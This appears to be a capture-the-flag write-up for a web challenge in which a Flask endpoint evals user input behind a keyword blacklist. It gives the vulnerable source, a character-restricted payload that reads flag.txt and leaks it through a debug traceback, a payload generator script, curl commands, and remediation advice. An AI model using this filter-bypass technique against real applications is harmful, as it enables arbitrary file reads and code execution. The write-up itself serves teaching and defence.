# scriptCTF 2026 — wpm-game (Web)

- **Author:** NoobMaster
- **Category:** Web
- **Description:** *"Let's test out your words per minute! The website is under development though, might not be fully secure.... Flag is in flag.txt."*

## Short Overview

`/rate?wpm=` passes user input directly to **`eval()`**. The `check()` blacklist is bypassed by building the filename `"/app/flag.txt"` byte-by-byte as `bytes([1+1+…+1])` sums, reading the flag with `next(open(...))`, and leaking it through a `KeyError` whose message is rendered by the **Flask debugger** (`debug=True`).

## Source Review

```python
def rate(wpm) -> float:
    if wpm < 50:
        return "slow"
    if wpm < 100:
        return "progressing"
    if wpm < 200:
        return "good"
    if wpm < 350:
        return "goated"
    if wpm > 900:
        return "even robots can't do that"

def check(string):
    # Oops chat I might have accidently made it unsolvable. Only one way to find out? Let's see if you are 1337 enough
    string = string.lower()
    disallowed = [".","_","import", "=", ",", "'", '"', "attr", "global", "local", ";", ":", "^", "/", ">", "<", "{", "}", "m", "a", "not", "and", "or", "eval", "exec", "for", "in"
     , "chr", "ord", "hex", "int", "repr", "str", "dir", "set", "len", "SENTENCES", "random", "request", "app", "flask"]
    c = any([x in string for x in disallowed])
    non_ascii = any([ord(x) < 32 for x in string]) or any([ord(x) > 126 for x in string])
    return c or non_ascii or len(set(string)) > 18

@app.route("/rate")
def rate_wpm():
    try:
        wpm = request.args.get("wpm", "")
    except ValueError:
        return jsonify(error="invalid wpm"), 400
    if check(wpm):
        return "Invalid WPM!"
    return jsonify(verdict=rate(eval(wpm.lower())), wpm=float(wpm))

if __name__ == "__main__":
    app.run('0.0.0.0', debug=True)
```

The frontend (`index.html`) is a red herring - WPM is computed entirely client-side and shipped to `/rate`. The real bug is server-side:

```python
return jsonify(verdict=rate(eval(wpm.lower())), wpm=float(wpm))
```

`eval(wpm.lower())` is **arbitrary code execution** on a user-controlled string, gated only by `check()`. (Side note: the `try/except ValueError` around `request.args.get()` is dead code — that call can never raise. The author's "validation" is elsewhere, and it doesn't work.)

## The Filter: Why It Looks Unsolvable

`check(wpm)` rejects input containing **any** of:

- **Syntax killers:** `.` `_` `=` `,` `;` `:` `^` `/` `>` `<` `{` `}` and both quote types → no attribute access, no string literals, no function arguments
- **Keyword killers:** `import`, `not`, `and`, `or`, `for`, `in`, `eval`, `exec`, plus builtins `chr`, `ord`, `int`, `str`, `dir`, `set`, `len`, ...
- **Letters `m` and `a`** (anywhere, case-insensitive) → `__class__`, `__globals__`, `app`, `flag`, `read`, `system`, ... all impossible
- **Non-ASCII** and **more than 18 unique characters**

### The Bypass

| Constraint | Workaround |
|---|---|
| no `"` / `'` | build strings as `bytes([...])` |
| no `.` | builtins only (`open`, `next`, `bytes`, `dict`) — zero attribute access |
| no `/`, `m`, `a` in payload | path never appears as text — only as integer sums |
| no `,` | `bytes([x])` takes a single argument |
| `len(set(s)) ≤ 18` | each byte value encoded as `1+1+…+1` (only adds `1` and `+` to the charset) |
| no `in`, `or`, `not`, `for`, ... | `dict`, `next`, `open`, `bytes` contain none of the banned substrings |

### The 18-Character Charset

The **URL-decoded** payload uses exactly **18 unique characters**, so `len(set(string)) > 18` evaluates to `False` and `check()` passes:

```
d i c t   n e x t   o p e n   b y t e s   ( ) [ ]   1 +
```

Notably absent: `a`, `m`, quotes, dots, commas, slashes, and every digit except `1`. (Using something like `bytes([47])` would blow the budget — digits `0,2-9` push the unique count to 27.)

## Building the Payload

`/app/flag.txt` decodes to the byte values:

```
47  97  112  112  47  102  108  97  103  46  116  120  116
```

Each byte `N` becomes `bytes([1+1+…+1])` with `N` ones (the sum equals `N`). Concatenating with `+` yields the full path as a `bytes` object:

```
open(bytes([1+1+...+1]) + bytes([1+1+...+1]) + ... + bytes([1+1+...+1]))
```

The full expression:

```
dict()[next(open(bytes([1+1+...+1])+bytes([1+1+...+1])+...+bytes([1+1+...+1])))]
```

- `open(path)` → file object
- `next(file)` → **first line of flag.txt** (no `.` needed; `.read()` is impossible anyway — it contains `a`)
- `dict()[<flag line>]` → **`KeyError: 'scriptCTF{...}'`**

The `dict()[...]` wrap is the exfiltration trick: if `eval` merely *returned* the flag, `rate()` would raise `TypeError: '<' not supported between instances of 'str' and 'int'` — which leaks nothing. A `KeyError` **embeds the key in the exception message**, and `app.run(debug=True)` makes the Werkzeug debugger render the full traceback to the attacker.

## Exploit Generator

```python
flag = b"/app/flag.txt"                # path to read
for i in flag:
    print(i)                           # 47 97 112 112 47 102 108 97 103 46 116 120 116

payload = b"dict%28%29%5bnext%28open%28"   # dict()[next(open(
for i in flag:
    payload += b"bytes%28%5b"              # bytes([
    for k in range(i - 1):
        payload += b"1%2b"                 # 1+  (i-1 times)
    payload += b"1%5d%29%2b"               # 1])+  -> i ones total, sums to byte value i
payload = payload[:-3]                     # drop trailing "+"
payload += b"%29%29%5d"                    # ))]  closes open( next( dict()[

print(payload)
print(len(set(payload)))   # 23 unique bytes in the *encoded* form — irrelevant
```

### Two Subtleties

1. **`%2b` instead of `+`:** a literal `+` in a query string is decoded to a space by form-encoding; `%2b` guarantees the server sees a real `+` so `eval` performs integer addition.
2. **`len(set(payload))` prints 23**, which looks like a fail — but `check()` runs on the **URL-decoded** string, whose charset is exactly 18. The decoded form is what must satisfy `len(set(...)) <= 18`.

## Exploitation

```bash
curl 'https://ada0dc67-2669-42e9-a32e-24965d99ada4.challs.scriptsorcerers.xyz/rate?wpm=<PAYLOAD>'
```

`check()` returns `False` → `eval()` executes → `dict()[next(open(...))]` raises `KeyError` → the 500 debug page shows:

```
KeyError: 'scriptCTF{...}'
```

The flag leaks in the innermost frame of the Werkzeug traceback. Extract it with:

```bash
curl -s '.../rate?wpm=<PAYLOAD>' | grep -o 'scriptCTF{[^}]*}'
```

## Flag Format

```
scriptCTF{…}
```

## Remediation

1. **Never `eval` user input** — parse with `float(wpm)` inside a real `try/except`, or validate against a numeric regex first.
2. **`debug=True` in production** — the Werkzeug debugger turns every exception into a full traceback (and an interactive console). This is what converted a crash into an exploit.
3. **Don't trust the client for scoring** — track sentence + start timestamp server-side per session; compute WPM from server data, not from a client-supplied number.
4. **Keep `flag.txt` out of the app directory** and enforce least privilege on what the app process can read.
